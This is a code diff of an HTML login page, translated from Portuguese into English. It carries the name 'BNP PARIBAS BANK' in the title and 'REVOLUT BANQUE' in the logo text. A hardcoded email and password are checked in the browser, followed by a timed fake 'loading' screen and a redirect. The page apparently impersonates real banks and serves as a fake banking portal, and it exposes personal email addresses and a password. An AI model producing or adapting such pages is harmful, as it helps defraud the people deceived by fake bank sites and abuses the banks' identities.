@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8"> 
-    <title></title>
+    <title>BNP PARIBAS BANK</title>
     <link href="https://fonts.googleapis.com/css?family=Assistant:400,700" rel="stylesheet">
     <link rel="stylesheet" href="./style.css">
     <!-- Liens vers les fichiers CSS de Bootstrap -->
@@ -23,13 +23,13 @@
   <div class='head'>
       <img src='ot_logo.jpg' alt='Logo de REVOLUT BANQUE'>
   </div>
-  <p class='msg' style='font-size: 24px; font-family: Montserrat, sans-serif;'>Bem-vindo à área de login!</p>
+  <p class='msg' style='font-size: 24px; font-family: Montserrat, sans-serif;'>Welcome to the login area!</p>
 
   <div class='form'>
       <form>
-          <input type="text" placeholder='Por favor, indique o seu endereço de e-mail' class='text' id='username' required><br>
-          <input type="password" placeholder='Por favor, insira sua senha' class='password' id='password' required><br>
-          <a href="#" class='btn-login' id='do-login'>Contato</a>
+          <input type="text" placeholder='Please enter your e-mail address' class='text' id='username' required><br>
+          <input type="password" placeholder='Please enter your password' class='password' id='password' required><br>
+          <a href="#" class='btn-login' id='do-login'>Login</a>
       </form>
   </div>
 </section>
@@ -42,9 +42,9 @@
       <div class="modal-content">
           <div class="modal-body text-center">
               <div class="spinner-border text-primary" role="status">
-                  <span class="sr-only">Relacionamento atual...</span>
+                  <span class="sr-only">loading...</span>
               </div>
-              <p>Relacionamento atual..</p>
+              <p>loading...</p>
           </div>
       </div>
   </div>
@@ -54,7 +54,7 @@
 
 <script> 
   // Identifiants de connexion pré-définis
-  const usernameValide = "santos.ilson2@gmail.com";
+  const usernameValide = "alohalanikaliloa@gmail.com";
   const motDePasseValide = "A1P5ASPDO";
 
   document.getElementById('do-login').addEventListener('click', function () {
@@ -85,7 +85,7 @@
     }, 1000); // Redirige après 1 seconde (ajustez si nécessaire)
 }, 4000); // 4000 millisecondes (4 secondes)
       } else {
-          alert("Usuário ou senha incorretos.");
+          alert("Incorrect username or password.");
       }
   });
 </script>
